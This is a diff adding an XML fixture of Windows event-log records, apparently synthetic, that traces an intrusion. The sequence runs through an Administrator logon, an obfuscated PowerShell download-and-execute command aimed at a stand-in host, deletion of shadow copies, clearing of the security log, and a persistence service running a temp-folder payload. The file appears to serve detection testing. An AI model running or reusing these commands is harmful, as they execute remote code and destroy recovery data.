@@ -1,0 +1,88 @@
+<Events>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4625</EventID>
+      <TimeCreated SystemTime="2026-11-07T03:14:02.100000Z" />
+      <Channel>Security</Channel>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">Administrator</Data>
+      <Data Name="IpAddress">192.168.1.180</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="Status">0xC000006D</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4624</EventID>
+      <TimeCreated SystemTime="2026-11-07T03:15:30.450000Z" />
+      <Channel>Security</Channel>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">Administrator</Data>
+      <Data Name="IpAddress">192.168.1.180</Data>
+      <Data Name="LogonType">10</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-11-07T03:16:10.000000Z" />
+      <Channel>Security</Channel>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">Administrator</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="CommandLine">powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwAnACkA</Data>
+      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-11-07T03:17:05.120000Z" />
+      <Channel>Security</Channel>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">Administrator</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\vssadmin.exe</Data>
+      <Data Name="CommandLine">vssadmin.exe delete shadows /all /quiet</Data>
+      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>1102</EventID>
+      <TimeCreated SystemTime="2026-11-07T03:18:40.900000Z" />
+      <Channel>Security</Channel>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">Administrator</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-System" />
+      <EventID>7045</EventID>
+      <TimeCreated SystemTime="2026-11-07T03:19:15.000000Z" />
+      <Channel>System</Channel>
+    </System>
+    <EventData>
+      <Data Name="ServiceName">AnubisPersistSvc</Data>
+      <Data Name="ImagePath">C:\Windows\Temp\payload.exe</Data>
+      <Data Name="ServiceType">user mode service</Data>
+      <Data Name="StartType">auto start</Data>
+      <Data Name="AccountName">LocalSystem</Data>
+    </EventData>
+  </Event>
+</Events>
